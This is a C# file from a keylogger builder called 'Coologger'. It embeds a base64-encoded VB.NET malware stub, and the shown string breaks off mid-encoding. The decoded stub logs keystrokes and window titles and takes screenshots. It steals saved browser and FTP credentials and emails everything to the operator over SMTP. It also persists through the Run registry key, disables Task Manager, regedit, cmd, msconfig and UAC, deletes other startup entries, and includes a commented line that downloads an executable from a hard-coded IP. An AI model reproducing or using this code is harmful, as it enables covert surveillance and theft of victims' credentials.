using System;
using System.Collections.Generic;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Coologger
{
    class Global
    {
        public static Thread BeatThread;
        public static object Form;
        public static string HID;

        public static string Source;
        public static string sourceAv = Encoding.Default.GetString(Convert.FromBase64String("SW1wb3J0cyBTeXN0ZW0uQ29sbGVjdGlvbnMsIE1pY3Jvc29mdC5XaW4zMiwgU3lzdGVtLkRhdGEsIFN5c3RlbS5UaHJlYWRpbmcsIFN5c3RlbS5OZXQuTWFpbCwgU3lzdGVtLklPLCBTeXN0ZW0uVGV4dCwgU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeSwgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLCBTeXN0ZW0uUmVmbGVjdGlvbiwgTWljcm9zb2Z0LlZpc3VhbEJhc2ljLCBTeXN0ZW0sIFN5c3RlbS5XaW5kb3dzLkZvcm1zLCBTeXN0ZW0uRW52aXJvbm1lbnQsIFN5c3RlbS5EaWFnbm9zdGljcywgU3lzdGVtLkNvbXBvbmVudE1vZGVsLCBTeXN0ZW0uRHJhd2luZw0KPEFzc2VtYmx5OiBBc3NlbWJseVRpdGxlKCJbNDldIik+IA0KPEFzc2VtYmx5OiBBc3NlbWJseURlc2NyaXB0aW9uKCJbNTBdIik+IA0KPEFzc2VtYmx5OiBBc3NlbWJseUNvbXBhbnkoIls1MV0iKT4gDQo8QXNzZW1ibHk6IEFzc2VtYmx5UHJvZHVjdCgiWzUyXSIpPiANCjxBc3NlbWJseTogQXNzZW1ibHlDb3B5cmlnaHQoIls1M10iKT4gDQpNb2R1bGUgWzI0XQ0KICAgIERpbSBbOTNdIGFzIHN0cmluZyA9ICIqbG9nb25seSoiDQoJRGltIFs5OV0gYXMgc3RyaW5nID0gIipwcm9jZXNzKiINCiAgICBEaW0gWzI1XSBhcyBTdHJpbmcgPSAiKmVtYWlsKiINCiAgICBEaW0gWzI2XSBhcyBTdHJpbmcgPSAiKmVtYWlscGFzcyoiDQogICAgRGltIFsyN10gYXMgU3RyaW5nID0gIipob3N0KiINCglEaW0gWzEzMF0gYXMgc3RyaW5nID0gIippbnN0YWxsKiINCmRpbSBbMTMxXSBhcyBzdHJpbmcgPSAiKnRpdGxlKiINCiAgICBEaW0gWzk1XSBhcyBzdHJpbmcgPSAiKmVycm9yKiINCglEaW0gWzI4XSBhcyBpbnRlZ2VyID0gKnBvcnQqDQogICAgRGltIFs1XSwgWzZdLCBbN10sIFs4XSwgWzldLCBbMjNdLCBbODldLCBbOTFdLCBbOTRdLCBbOTZdLFs5N10sWzk4XSwgWzkyXSwgWzEzMl0gLCBbMTMzXSwgWzEzNV0gYXMgc3RyaW5nICdvcHRpb25zDQogICAgRGltIFszMF0gYXMgaW50ZWdlciA9ICppbnRlcnZhbCoNCiAgICBEaW0gWzU1XSBhcyBTdHJpbmcgPSBub3RoaW5nDQogICAgZGltIFs1OF0gYXMgc3RyaW5nID0gIlVrVkhJR0ZrWkNCSVMwTlZYRk52Wm5SM1lYSmxYRkJ2YkdsamFXVnpYRTFwWTNKdmMyOW1kRnhYYVc1a2IzZHpYRk41YzNSbGJTQXZkaUJFYVhOaFlteGxRMDFFSUM5MElGSkZSMTlFVjA5U1JDQXZaQ0F4SUM5bSIgJ2NtZA0KICAgIGRpbSBbNTldIGFzIHN0cmluZyA9ICJVa1ZISUdGa1pDQklTME5WWEZOdlpuUjNZWEpsWEUxcFkzSnZjMjltZEZ4WGFXNWtiM2R6WEVOMWNuSmxiblJXWlhKemFXOXVYRkJ2YkdsamFXVnpYRk41YzNSbGJTQXZkaUJFYVhOaFlteGxVbVZuYVhOMGNubFViMjlzY3lBdmRDQlNSVWRmUkZkUFVrUWdMMlFnTVNBdlpnPT0iICdyZWdlZGl0DQogICAgZGltIFs2MF0gYXMgc3RyaW5nID0gIlVrVkhJR0ZrWkNCSVMwTlZYRk52Wm5SM1lYSmxYRTFwWTNKdmMyOW1kRnhYYVc1a2IzZHpYRU4xY25KbGJuUldaWEp6YVc5dVhGQnZiR2xqYVdWelhGTjVjM1JsYlNBdmRpQkVhWE5oWW14bFZHRnphMDFuY2lBdmRDQlNSVWRmUkZkUFVrUWdMMlFnTVNBdlpnPT0iICd0YXNtZ3INCglEaW0gWzEwMV0gYXMgc3RyaW5nID0gIlRWTkRUMDVHU1VjdVJWaEYiDQoJZGltIFsxMDJdIGFzIHN0cmluZyA9ICJtdHlcZWNsUG5pclZucnVcd2RpXGZzcmlccndmU2VzU3NpaW9cb3NldGVyQ3Nvbld0b29jTWVhdG8iDQoJRGltIFsxMDBdIGFzIHN0cmluZyA9ICJzdFBwQW5pclZucnVcd2RpXGZzcmlcUldGU2hhIHBcb3NldGVyQ3Nvbld0b29jTUVBVE8iDQogICAgZGltIFsyOV0gYXMgb2JqZWN0ID0gRW52aXJvbm1lbnQuR2V0Rm9sZGVyUGF0aChFbnZpcm9ubWVudC5TcGVjaWFsRm9sZGVyLkFwcGxpY2F0aW9uRGF0YSkNCiAgICBkaW0gWzMxXSBhcyBzdHJpbmcgPSBFbnZpcm9ubWVudC5HZXRGb2xkZXJQYXRoKEVudmlyb25tZW50LlNwZWNpYWxGb2xkZXIuQXBwbGljYXRpb25EYXRhKQ0KICAgIFB1YmxpYyBbMzJdIEFzIE5ldyBNYWlsTWVzc2FnZSgpDQogICAgRGltIFszN10gQXMgTmV3IFNtdHBDbGllbnQoKQ0KICAgIFByaXZhdGUgWzEzNF0gYXMgTXV0ZXgNCiAgICBQcml2YXRlIERlY2xhcmUgRnVuY3Rpb24gR2V0Rm9yZWdyb3VuZFdpbmRvdyBMaWIgInVzZXIzMi5kbGwiICgpIEFzIEludDMyICdnZXRmb3JlZ3JvbmR3aW5kb3cNCiAgICBQcml2YXRlIERlY2xhcmUgRnVuY3Rpb24gWzE1XSBMaWIgInVzZXIzMi5kbGwiIEFsaWFzICJHZXRXaW5kb3dUZXh0QSIgKEJ5VmFsIGh3bmQgQXMgSW50MzIsIEJ5VmFsIGxwU3RyaW5nIEFzIFN0cmluZywgQnlWYWwgY2NoIEFzIEludDMyKSBBcyBJbnQzMiAnZ2V0d2luZG93dGV4dA0KICAgIERpbSBbM10gQXMgT2JqZWN0ID0gSU8uUGF0aC5HZXRGaWxlTmFtZShbNjZdKQ0KCUZyaWVuZCBXaXRoRXZlbnRzIFZTYlFKRHhha3ZvVXVzTFFhTm13diBBcyBOZXcgaVRZVUxTeWNGZ1BjRGJEZEgNCiAgICBEaW0gWzU0XSBBcyBOZXcgU3lzdGVtLldpbmRvd3MuRm9ybXMuUmljaFRleHRCb3gNCiAgICBEaW0gWzY2XSBhcyBvYmplY3QgPSBBcHBsaWNhdGlvbi5FeGVjdXRhYmxlUGF0aA0KICAgIFB1YmxpYyBbODhdIEFzIE5ldyBTeXN0ZW0uV2luZG93cy5Gb3Jtcy5SaWNoVGV4dEJveA0KICAgDQoJDQpTdWIgbWFpbigpDQogICAgICAgIG9uIGVycm9yIHJlc3VtZSBuZXh0DQonb3B0aW9ucw0KICAgICAgICBbMjNdID0gJTYlICdzY3JlZW5zaG90cw0KICAgICAgICBbN10gPSAlMyUgJ2NtZA0KICAgICAgICBbOF0gPSAlNCUgICdyZWdlZGl0DQogICAgICAgIFs5XSA9ICU1JSAndGFza21hbmFnZXINCiAgICAgICAgWzZdID0gJTElICdtZWx0DQogICAgICAgIFs1XSA9ICUyJSAnc3RhcnR1cA0KICAgICAgICBbODldID0gJTclICdtc2NvbmZpZw0KICAgICAgICBbOTFdID0gJTglICd1c2INCiAgICAgICAgWzkyXSA9ICU5JSAnbG9nIG9ubHkgaWYNCgkJWzk0XSA9ICUxMCUNCgkJWzk2XSA9ICUxMSUgJ3VhYw0KCQlbOTddID0gJTEyJSAncHJvY2Vzc3Byb3RlY3QNCgkJWzk4XSA9ICUxMyUgJ2tpbGwNClsxMzJdID0gJTE0JSAnbG9nIGNvcGllZCB0ZXh0DQpbMTMzXSA9ICUxNSUgJ2JvdCBraWxsZXINClsxMzVdID0gJTE3JSAnbm90aWZ0DQogDQogICAgICAgIERpbSBbMV0gQXMgT2JqZWN0DQogICAgICAgIFsxXSA9IEFwcGxpY2F0aW9uLlN0YXJ0dXBQYXRoDQogICAgICAgIElmIFsxXSA9IFsyOV0gVGhlbg0KICAgICAgICBFbHNlDQogICAgIA0KICAgICAgICAgICAgRGltIFsyXSBBcyBGaWxlU3RyZWFtID0gTm90aGluZw0KICAgICAgICAgICAgWzJdID0gRmlsZS5DcmVhdGUoWzI5XSAmICJcWzEzXS50eHQiKQ0KDQogICAgICAgICAgICBVc2luZyBbMl0NCiAgICAgICAgICAgIEVuZCBVc2luZw0KICAgICAgICAgICAgDQogICAgICAgICAgICBEaW0gWzRdIEFzIE5ldyBTdHJlYW1Xcml0ZXIoWzMxXSAmICJcWzEzXS50eHQiKQ0KICAgICAgICAgICAgWzRdLldyaXRlKFs2Nl0pDQogICAgICAgICAgICBbNF0uRmx1c2goKQ0KICAgICAgICAgICBbNF0uQ2xvc2UoKQ0KICAgICAgICAgICAgSWYgRmlsZS5FeGlzdHMoWzI5XSArICJcIiAmIFsxMzBdICYgIi5leGUiKSBUaGVuDQogICAgICAgICAgICAgICAgTXkuQ29tcHV0ZXIuRmlsZVN5c3RlbS5EZWxldGVGaWxlKFsyOV0gKyAiXCIgJiBbMTMwXSAmICIuZXhlIikNCiAgICAgICAgICAgICAgICBNeS5Db21wdXRlci5GaWxlU3lzdGVtLkNvcHlGaWxlKFs2Nl0sIFsyOV0gKyJcIiAmIFsxMzBdICYgIi5leGUiKQ0KICAgICAgICAgICAgRWxzZQ0KICAgICAgICAgICAgICAgIE15LkNvbXB1dGVyLkZpbGVTeXN0ZW0uQ29weUZpbGUoWzY2XSwgWzI5XSArICJcIiAmIFsxMzBdICYgIi5leGUiKQ0KICAgICAgICAgICAgRW5kIElmDQogICAgICAgICAgICBQcm9jZXNzLlN0YXJ0KFsyOV0gKyAiXCIgJiBbMTMwXSAmICIuZXhlIikNCmlmIFs5NF0gPSB0cnVlIHRoZW4NCgkgICBtc2dib3goWzk1XSwgLCBbMTMxXSkNCgkgICBlbmQgaWYNCmlmIFsxMzVdID0gdHJ1ZSB0aGVuDQpub3RpZnkoKQ0KZW5kIGlmDQogICAgICAgICAgICBFbmQNCiAgICAgICAgRW5kIElmDQoNCm11dGV4KCkNCg0KICAgICAgDQoNCg0KaWYgWzEzM10gPSB0cnVlIHRoZW4gJ2JvdGtpbGxlcg0KYm90a2lsbGVyKCkNCiAgICAgICAgICAgIEVuZCBJZg0KDQoNCiAgICAgICAgSWYgWzVdID0gdHJ1ZSB0aGVuICdzdGFydHVwDQogICAgICAgICAgICANCiAgICAgICAgICAgICAgICBEaW0gYXBwbmFtZSBBcyBTdHJpbmcgPSBJTy5QYXRoLkdldEZpbGVOYW1lKEFwcGxpY2F0aW9uLkV4ZWN1dGFibGVQYXRoKQ0KDQogICAgICAgICAgICBNeS5Db21wdXRlci5SZWdpc3RyeS5TZXRWYWx1ZSgiSEtFWV9DVVJSRU5UX1VTRVJcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuIiwgYXBwbmFtZSwgRW52aXJvbm1lbnQuR2V0Rm9sZGVyUGF0aChFbnZpcm9ubWVudC5TcGVjaWFsRm9sZGVyLkFwcGxpY2F0aW9uRGF0YSkgJiAiXCIgKyBhcHBuYW1lKQ0KCQkJDQoJCQkNCiAgICAgICAgICAgIEVsc2UNCiAgICAgICAgICAgIEVuZCBJZg0KICAgICAgICANCg0KICAgICAgICBJZiBbNl0gPSB0cnVlIHRoZW4gJ21lbHQNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIERpbSBbMTJdIEFzIE9iamVjdA0KICAgICAgICAgICAgICAgIFsxMl0gPSBNeS5Db21wdXRlci5GaWxlU3lzdGVtLlJlYWRBbGxUZXh0KFsyOV0gJiAiXFsxM10udHh0IikNCiAgICAgICAgICAgICAgICBNeS5Db21wdXRlci5GaWxlU3lzdGVtLkRlbGV0ZUZpbGUoWzEyXSkNCiAgICAgICAgICAgIA0KICAgICAgICBFbmQgSWYNCg0KIElmIFs4OV0gPSB0cnVlIHRoZW4gJ2Rpc2FibGUgbXNjb25maWcNCiANCiAgICAgICAgRGltIFs5MF0gQXMgTWljcm9zb2Z0LldpbjMyLlJlZ2lzdHJ5S2V5DQogICAgICAgICAgICBbOTBdID0gTWljcm9zb2Z0LldpbjMyLlJlZ2lzdHJ5LkxvY2FsTWFjaGluZS5PcGVuU3ViS2V5KFs2NF0oWzEwMF0pLCBUcnVlKQ0KICAgICAgICAgICAgWzkwXS5EZWxldGVTdWJLZXkoWzQyXShbMTAxXSksIFRydWUpDQogICAgICAgICAgICBbOTBdLkNsb3NlKCkNCgkJCQ0KICAgICAgICAgICAgRW5kIElmDQogICAgICAgICAgICANCiAgICAgICAgSWYgWzkxXSA9IHRydWUgdGhlbiAnVVNCIHNwcmVhZA0KICAgICAgICANCgkJWzEwNV0NCgkJDQoJCQ0KICAgICAgICBFbmQgSWYNCg0KICAgICAgDQoNCiAgICAgICAgSWYgWzhdID0gdHJ1ZSB0aGVuICdkaXNhYmxlIHJlZ2VkaXQNCiAgICAgICAgICAgIFNoZWxsKFs0Ml0oWzU5XSksIHZiTm9ybWFsRm9jdXMpDQogICAgICAgIEVuZCBJZg0KDQogICAgICAgIElmIFs5XSA9IHRydWUgdGhlbiAnZGlzYWJsZSB0YXNrbWcNCiAgICAgICAgICAgIFNoZWxsKFs0Ml0oWzYwXSksIHZiTm9ybWFsRm9jdXMpDQoNCiAgICAgICAgRW5kIElmDQoNCiAgSWYgWzddID0gdHJ1ZSB0aGVuICdkaXNhYmxlIGNtZA0KICAgICAgICAgICAgU2hlbGwoWzQyXShbNThdKSwgdmJOb3JtYWxGb2N1cykNCiAgICAgICAgRW5kIElmDQoJCQ0KCQlpZiBbOTZdID0gdHJ1ZSB0aGVuICd1YWMNCgkJDQoJCURlYWN0aXZhdGVVQUMoKQ0KCQkNCgkJZW5kIGlmDQoJCQ0KCQknaWYgWzk3XSA9IHRydWUgdGhlbiAncHJvY2Vzcw0KCQkNCgkJJ015LkNvbXB1dGVyLk5ldHdvcmsuRG93bmxvYWRGaWxlKCJodHRwOi8vMTczLjIxMi4yMDcuMTc2L2Nvb2xvZ2dlci9wcm9jZXNzLmV4ZSIsIEVudmlyb25tZW50LkdldEZvbGRlclBhdGgoRW52aXJvbm1lbnQuU3BlY2lhbEZvbGRlci5BcHBsaWNhdGlvbkRhdGEpICYgIlxTeXNpbmkuZXhlIikNCgkJJ1Byb2Nlc3MuU3RhcnQoRW52aXJvbm1lbnQuR2V0Rm9sZGVyUGF0aChFbnZpcm9ubWVudC5TcGVjaWFsRm9sZGVyLkFwcGxpY2F0aW9uRGF0YSkgJiAiXFN5c2luaS5leGUiKQ0KCQkNCgkJDQoJCSdlbmQgaWYNCgkJDQoJCQ0KCQlpZiBbOThdID0gdHJ1ZSB0aGVuICdwcm9jZXNza2lsbA0KCQkNCgkJUHJvY2Vzcy5HZXRQcm9jZXNzZXNCeU5hbWUoWzk5XSkoMCkuQ2xvc2VNYWluV2luZG93KCkNCgkJDQoJCQ0KCQllbmQgaWYNCgkJDQoNCiAgICAgICAgRGltIFsyMF0gYXMgTmV3IFN5c3RlbS5XaW5kb3dzLkZvcm1zLnRpbWVyDQogICAgICAgIFsyMF0uaW50ZXJ2YWwgPSAqaW50ZXJ2YWwqDQogICAgICAgIEFkZEhhbmRsZXIgWzIwXS5UaWNrLCBBZGRyZXNzT2YgWzIwXV9UaWNrZWQNCiAgICAgICAgWzIwXS5zdGFydA0KDQogRGltIFsyMV0gQXMgTmV3IFN5c3RlbS5XaW5kb3dzLkZvcm1zLlRpbWVyDQogICAgICAgIFsyMV0uSW50ZXJ2YWwgPSAzMDANCiAgICAgICAgQWRkSGFuZGxlciBbMjFdLlRpY2ssIEFkZHJlc3NPZiBbMjFdX1RpY2tlZA0KICAgICAgICBbMjFdLnN0YXJ0DQoJCQ0KCQkNCgkJICAgKjIqICdjaHJvbXMNCgkJICAgKjEqDQoJICAgICAgICAgICAgICAgICAgICAgKjUqICdmaWxlemlsbGENCgkJICAgKjQqICdjb3JlZnRwDQoJCSAgICozKiAnSUUNCgkJICAgKjYqICdmbGFzaGZ4cA0KCQkgICAqNyogJ2Z0cGNvbW1hbmRlcg0KCQkgICAqOCogJ2ltdnUNCgkJICAgKjkqICdub2lwDQoJCSAgICoxMCogJ3NtYXJ0ZnRwDQoJCSAgICoxMSogJ2ZpcmVmb3gNCgkJICAgKjEyKiAnd2luZG93cyBrZXkNCgkJICAgKjEzKiAnTmV4dXMuZGJzdGVhbGVyDQoJCSAgICoxNCogJ3JzaW5pDQogICAgICAgICAgIGlmIFs4OF0udGV4dCA8PiAiIiB0aGVuDQogICAgICAgICAgIHN0ZWFsZXJzZW5kDQogICAgICAgICAgIGVuZCBpZg0KCQkgICANCgkJDQogICAgICANCgkgDQogICAgICAgIEFwcGxpY2F0aW9uLlJ1bigpDQogICAgRW5kIFN1Yg0KICAgIA0KICAgIFByaXZhdGUgRnVuY3Rpb24gWzE2XSgpIEFzIFN0cmluZw0KICAgICAgICBEaW0gWzE3XSBBcyBTdHJpbmcNCiAgICAgICAgWzE3XSA9IE5ldyBTdHJpbmcoQ2hyKDApLCAxMDApDQogICAgICAgIFsxNV0oR2V0Rm9yZWdyb3VuZFdpbmRvdywgWzE3XSwgMTAwKQ0KICAgICAgICBbMTddID0gWzE3XS5TdWJzdHJpbmcoMCwgSW5TdHIoWzE3XSwgQ2hyKDApKSAtIDEpDQogICAgICAgIFJldHVybiBbMTddDQogICAgRW5kIEZ1bmN0aW9uDQogICAgUHVibGljIEZ1bmN0aW9uIFs0Ml0oQnlWYWwgWzQ1XSBBcyBTdHJpbmcpIEFzIFN0cmluZw0KICAgICAgICBEaW0gWzQzXSgpIEFzIEJ5dGUgPSBDb252ZXJ0LkZyb21CYXNlNjRTdHJpbmcoWzQ1XSkNCiAgICAgICAgRGltIFs0NF0gQXMgU3RyaW5nID0gQVNDSUlFbmNvZGluZy5BU0NJSS5HZXRTdHJpbmcoWzQzXSkNCiAgICAgICAgWzQyXSA9IFs0NF0NCiAgICBFbmQgRnVuY3Rpb24NCiAgIA0KDQogICAgU3ViIFsyMF1fVGlja2VkKEJ5VmFsIHNlbmRlciBBcyBTeXN0ZW0uT2JqZWN0LCBCeVZhbCBlIEFzIFN5c3RlbS5FdmVudEFyZ3MpDQogICAgICAgIGlmIFs5Ml0gPSB0cnVlIHRoZW4NCgkJaWYgWzU0XS50ZXh0LmNvbnRhaW5zKFs5M10pIHRoZW4NCgkJSWYgWzIzXSA9IFRydWUgdGhlbg0KICAgICAgICAgICAgc21haWwNCiAgICAgICAgRWxzZQ0KICAgICAgICAgIG5tYWlsDQoJCSAgZW5kIGlmDQoJCSAgZWxzZQ0KCQkgIFs1NF0udGV4dCA9ICIiDQoJCSAgZW5kIGlmDQoJCSAgZWxzZQ0KCQkgIElmIFsyM10gPSBUcnVlIHRoZW4NCiAgICAgICAgICAgIHNtYWlsDQogICAgICAgIEVsc2UNCiAgICAgICAgICBubWFpbA0KCQkgIA0KCQkgIGVuZCBpZg0KCQkgIGVuZCBpZg0KICAgICAgICAgICAgZW5kIHN1Yg0KICAgICAgIFB1YmxpYyBGdW5jdGlvbiBib3RraWxsZXIoKQ0KICAgICAgICBEaW0gciBBcyBSZWdpc3RyeUtleSA9IFJlZ2lzdHJ5LkN1cnJlbnRVc2VyLk9wZW5TdWJLZXkoIlNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1blwiKQ0KICAgICAgICBGb3IgRWFjaCB2YWx1ZSBBcyBTdHJpbmcgSW4gci5HZXRWYWx1ZU5hbWVzDQogICAgICAgICAgICBUcnkNCiAgICAgICAgICAgICAgICByLkRlbGV0ZVZhbHVlKHZhbHVlKQ0KICAgICAgICAgICAgQ2F0Y2gNCiAgICAgICAgICAgIEVuZCBUcnkNCiAgICAgICAgTmV4dA0KICAgICAgICBSZXR1cm4gVHJ1ZQ0KICAgIEVuZCBGdW5jdGlvbg0KCSAgDQoJICBQdWJsaWMgRnVuY3Rpb24gc3RlYWxlcnNlbmQNCgkgICB0cnkNCiAgV2l0aCBbMzJdDQogIA0KICAgICAgICAgICAgICAgIC5Gcm9tID0gTmV3IE1haWxBZGRyZXNzKFs2Ml0uWzYzXShbNjRdKFs0Ml0oWzI1XSkpKSkNCiAgICAgICAgICAgICAgICAuVG8uQWRkKFs2Ml0uWzYzXShbNjRdKFs0Ml0oWzI1XSkpKSkNCiAgICAgICAgICAgICAgICAuU3ViamVjdCA9ICJDb29Mb2dnZXIgUmVjb3ZlcmVkIERhdGEgZnJvbSAtICIgJiBFbnZpcm9ubWVudC5Vc2VyTmFtZQ0KICAgICAgICAgICAgICAgIC5Cb2R5ID0gKCJ+fn5+flN0ZWFsZXJzfn5+fn4iICYgdmJuZXdsaW5lICYgdmJuZXdsaW5lICYgdmJuZXdsaW5lICYgaWVkYXRhICYgWzg4XS5UZXh0KQ0KICAgICAgICAgICAgRW5kIFdpdGgNCg0KICAgICAgICAgICAgV2l0aCBbMzddDQogICAgICAgICAgICAgICAgLkhvc3QgPSAiKmhvc3QqIg0KICAgICAgICAgICAgICAgIC5Qb3J0ID0gKnBvcnQqDQogICAgICAgICAgICAgICAgLkVuYWJsZVNzbCA9IFRydWUNCiAgICAgICAgICAgICAgICAuQ3JlZGVudGlhbHMgPSBOZXcgU3lzdGVtLk5ldC5OZXR3b3JrQ3JlZGVudGlhbChbNjJdLls2M10oWzY0XShbNDJdKFsyNV0pKSksIFs2Ml0uWzYzXShbNjRdKFs0Ml0oWzI2XSkpKSkNCiAgICAgICAgICAgICAgICAuU2VuZChbMzJdKQ0KICAgICAgICAgICAgRW5kIFdpdGgNCiAgICAgICAgICAgIA0KCQkJWzg4XS5UZXh0ID0gIiINClszMl0uQXR0YWNobWVudHMuQ2xlYXIoKQ0KCQkJY2F0Y2ggZXggYXMgZXhjZXB0aW9uIA0KCQkJZW5kIHRyeQ0KcmV0dXJuIG5vdGhpbmcNCmVuZCBmdW5jdGlvbg0KICBQdWJsaWMgRnVuY3Rpb24gbm90aWZ5DQoJICANCg0KDQogdHJ5DQogIFdpdGggWzMyXQ0KICANCiAgICAgICAgICAgICAgICAuRnJvbSA9IE5ldyBNYWlsQWRkcmVzcyhbNjJdLls2M10oWzY0XShbNDJdKFsyNV0pKSkpDQogICAgICAgICAgICAgICAgLlRvLkFkZChbNjJdLls2M10oWzY0XShbNDJdKFsyNV0pKSkpDQogICAgICAgICAgICAgICAgLlN1YmplY3QgPSAiQ29vTG9nZ2VyIEluZmVjdGlvbiBOb3RpZmljYXRpb24iDQogICAgICAgICAgICAgICAgLkJvZHkgPSAoIkNvb0xvZ2dlciBJbnN0YWxsZWQgT24gLSAiICYgRW52aXJvbm1lbnQuVXNlck5hbWUpDQogICAgICAgICAgICBFbmQgV2l0aA0KDQogICAgICAgICAgICBXaXRoIFszN10NCiAgICAgICAgICAgICAgICAuSG9zdCA9ICIqaG9zdCoiDQogICAgICAgICAgICAgICAgLlBvcnQgPSAqcG9ydCoNCiAgICAgICAgICAgICAgICAuRW5hYmxlU3NsID0gVHJ1ZQ0KICAgICAgICAgICAgICAgIC5DcmVkZW50aWFscyA9IE5ldyBTeXN0ZW0uTmV0Lk5ldHdvcmtDcmVkZW50aWFsKFs2Ml0uWzYzXShbNjRdKFs0Ml0oWzI1XSkpKSwgWzYyXS5bNjNdKFs2NF0oWzQyXShbMjZdKSkpKQ0KICAgICAgICAgICAgICAgIC5TZW5kKFszMl0pDQogICAgICAgICAgICBFbmQgV2l0aA0KDQogICAgICAgICAgICBjYXRjaCBleCBhcyBleGNlcHRpb24gDQoJCQllbmQgdHJ5DQpyZXR1cm4gbm90aGluZw0KZW5kIGZ1bmN0aW9uDQpQcml2YXRlIFN1YiBtdXRleCgpDQogICAgICAgIFRyeQ0KICAgICAgICAgICAgU3lzdGVtLlRocmVhZGluZy5NdXRleC5PcGVuRXhpc3RpbmcoIiptdXRleCoiKQ0KICAgICAgICAgICAgRW5kDQogICAgICAgIENhdGNoIGV4IEFzIEV4Y2VwdGlvbg0KICAgICAgICAgICAgWzEzNF0gPSBOZXcgU3lzdGVtLlRocmVhZGluZy5NdXRleChGYWxzZSwgIiptdXRleCoiKQ0KICAgICAgICAgICAgRXhpdCBTdWINCiAgICAgICAgRW5kIFRyeQ0KICAgIEVuZCBTdWINClN1YiBbMjFdX1RpY2tlZChCeVZhbCBzZW5kZXIgQXMgU3lzdGVtLk9iamVjdCwgQnlWYWwgZSBBcyBTeXN0ZW0uRXZlbnRBcmdzKQ0KICAgICAgICBJZiBbNTVdIDw+IFsxNl0oKSBUaGVuDQogICAgICAgICAgICBbNTVdID0gWzE2XSgpDQogICAgICAgICAgICBJZiBbNTVdIDw+ICIiIFRoZW4NCiAgICAgICAgICAgICAgICBbNTRdLlRleHQgKz0gdmJOZXdMaW5lICsgdmJOZXdMaW5lICsgIn5+fn5+IiAmIFs1NV0gJiAiICgiICYgTm93LlRvTG9uZ1RpbWVTdHJpbmcgJiAiKX5+fn5+IiArIHZiTmV3TGluZQ0KICAgICAgICAgICAgRW5kIElmDQogICAgICAgIEVuZCBJZg0KICAgIEVuZCBTdWINCiAgICBQdWJsaWMgRnVuY3Rpb24gWzU3XShCeVZhbCBsZW5naHQgQXMgSW50ZWdlcikgQXMgU3RyaW5nDQogICAgICAgIFJhbmRvbWl6ZSgpDQogICAgICAgIERpbSBzIEFzIE5ldyBTeXN0ZW0uVGV4dC5TdHJpbmdCdWlsZGVyKCIiKQ0KICAgICAgICBEaW0gYigpIEFzIENoYXIgPSAiQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVphYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5eiIuVG9DaGFyQXJyYXkoKQ0KICAgICAgICBGb3IgaSAgQXMgSW50ZWdlciA9IDEgVG8gbGVuZ2h0DQogICAgICAgICAgICBSYW5kb21pemUoKQ0KICAgICAgICAgICAgRGltIHogQXMgSW50ZWdlciA9IEludCgoKGIuTGVuZ3RoIC0gMikgLSAwICsgMSkgKiBSbmQoKSkgKyAxDQogICAgICAgICAgICBzLkFwcGVuZChiKHopKQ0KICAgICAgICBOZXh0DQogICAgICAgIFJldHVybiBzLlRvU3RyaW5nDQogICAgRW5kIEZ1bmN0aW9uDQoNClB1YmxpYyBGdW5jdGlvbiBzbWFpbCgpIGFzIHN0cmluZw0KdHJ5DQpEaW0gWzQ2XSBBcyBTaXplID0gTmV3IFNpemUoTXkuQ29tcHV0ZXIuU2NyZWVuLkJvdW5kcy5XaWR0aCwgTXkuQ29tcHV0ZXIuU2NyZWVuLkJvdW5kcy5IZWlnaHQpDQogICAgICAgICAgICBEaW0gWzQ3XSBBcyBOZXcgQml0bWFwKE15LkNvbXB1dGVyLlNjcmVlbi5Cb3VuZHMuV2lkdGgsIE15LkNvbXB1dGVyLlNjcmVlbi5Cb3VuZHMuSGVpZ2h0KQ0KICAgICAgICAgICAgRGltIFs0OF0gQXMgU3lzdGVtLkRyYXdpbmcuR3JhcGhpY3MgPSBTeXN0ZW0uRHJhd2luZy5HcmFwaGljcy5Gcm9tSW1hZ2UoWzQ3XSkNCiAgICAgICAgICAgIFs0OF0uQ29weUZyb21TY3JlZW4oTmV3IFBvaW50KDAsIDApLCBOZXcgUG9pbnQoMCwgMCksIFs0Nl0pDQogICAgICAgICAgICBkaW0gWzU2XSBhcyBzdHJpbmcgPSBbNTddKDYpDQogICAgICAgICAgICBbNDddLlNhdmUoWzI5XSAmICJcIiAmIFs1Nl0gJiAiLmpwZWciKQ0KICAgICAgICAgICAgRGltIFszNF0gQXMgTmV3IE1haWxNZXNzYWdlKCkNCiAgICAgICAgICAgIERpbSBbMzVdIEFzIE5ldyBBdHRhY2htZW50KFsyOV0gJiAiXCIgJiBbNTZdICYgIi5qcGVnIikNCiAgICAgICAgICAgIFszNF0uRnJvbSA9IE5ldyBNYWlsQWRkcmVzcyhbNjJdLls2M10oWzY0XShbNDJdKFsyNV0pKSkpDQogICAgICAgICAgICBbMzRdLlRvLkFkZChbNjJdLls2M10oWzY0XShbNDJdKFsyNV0pKSkpDQogICAgICAgICAgICBbMzRdLlN1YmplY3QgPSAiQ09PTG9nZ2VyIExvZ3MgRnJvbSAtICIgJiBTeXN0ZW0uRW52aXJvbm1lbnQuVXNlck5hbWUNCiAgICAgICAgICAgIFszNF0uQm9keSA9ICgifn5+fn5LZXlsb2dnZXJ+fn5+fiIgJiB2Ym5ld2xpbmUgJiB2Ym5ld2xpbmUgJiB2Ym5ld2xpbmUgJiBbNTRdLlRleHQpDQogICAgICAgICAgICBbMzRdLkF0dGFjaG1lbnRzLkFkZChbMzVdKQ0KICAgICAgICAgICAgRGltIFszNl0gQXMgTmV3IFNtdHBDbGllbnQoIipob3N0KiIpDQogICAgICAgICAgICBbMzZdLlBvcnQgPSAqcG9ydCoNCiAgICAgICAgICAgIFszNl0uRW5hYmxlU3NsID0gVHJ1ZQ0KICAgICAgICAgICAgWzM2XS5DcmVkZW50aWFscyA9IE5ldyBTeXN0ZW0uTmV0Lk5ldHdvcmtDcmVkZW50aWFsKFs2Ml0uWzYzXShbNjRdKFs0Ml0oWzI1XSkpKSwgKFs2Ml0uWzYzXShbNjRdKFs0Ml0oWzI2XSkpKSkpDQogICAgICAgICAgICBbMzZdLkVuYWJsZVNzbCA9IFRydWUNCiAgICAgICAgICAgIFszNl0uU2VuZChbMzRdKQ0KICAgICAgI